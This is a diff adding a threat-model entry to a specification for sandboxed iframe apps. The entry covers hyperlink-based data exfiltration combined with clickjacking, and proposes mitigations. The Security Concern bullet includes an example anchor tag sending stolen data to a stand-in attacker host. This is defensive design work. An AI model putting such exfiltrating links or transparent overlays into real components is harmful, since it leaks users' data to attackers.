@@ -489,6 +489,14 @@ When an application declares required capabilities (e.g. `permissions: ["camera"
 1. **Dynamic Policy Construction:** The sandbox proxy uses `buildAllowAttribute(permissions)` to construct the `allow` attribute.
 2. **Capability Activation:** If granted, the `allow` attribute delegates capability access to the iframe (e.g. `allow="camera; clipboard-write;"`), enabling standard browser permission prompts and W3C Web APIs without requiring custom shims. If omitted, the default deny-all baseline remains enforced.
 
+### 1-Click Hyperlink Exfiltration via Navigation and Clickjacking Prevention
+
+- **Risk Assessment:** Likelihood: MED | Impact: HIGH | Relevant trust tiers: Tier 3 (Zero-trust untrusted) and Tier 2 (Semi-trusted partner).
+- **Security Concern:** While `connect-src 'none'` blocks API requests (`fetch`, `XMLHttpRequest`, `WebSocket`) and `form-action 'none'` blocks HTML form submissions, standard Content Security Policy directives do not govern normal hyperlink navigations. An embedded malicious script could read sensitive data model state or user inputs, dynamically construct an anchor tag containing the stolen data in query parameters (e.g., `<a href="https://attacker.com/leak?data=...">`), and use transparent CSS overlays to trick the user into clicking anywhere on the component. When combined with `allow-popups` in the iframe sandbox attributes, this click silently navigates to the attacker's server in a new tab or window, exfiltrating the payload.
+- **Recommended Architectural Controls & Future Work:**
+  - **Omit `allow-popups` by Default:** Remove `allow-popups` and `allow-popups-to-escape-sandbox` from the default sandbox attributes for Tier 3 untrusted iframe components, preventing programmatic or user-initiated new window spawns.
+  - **Capture-Phase Click Interception:** In the inner proxy sandbox document (`sandbox.html`), register a capturing-phase click listener (`document.addEventListener('click', ..., true)`) that cancels direct anchor navigations (`event.preventDefault()`) and requires external link opening to be routed through host-verified action events.
+
 # 6. Implementation guidelines
 
 For web-based platforms, developers SHOULD reuse the official `@modelcontextprotocol/ext-apps` SDK to handle the host-side bridge and sandbox proxy:
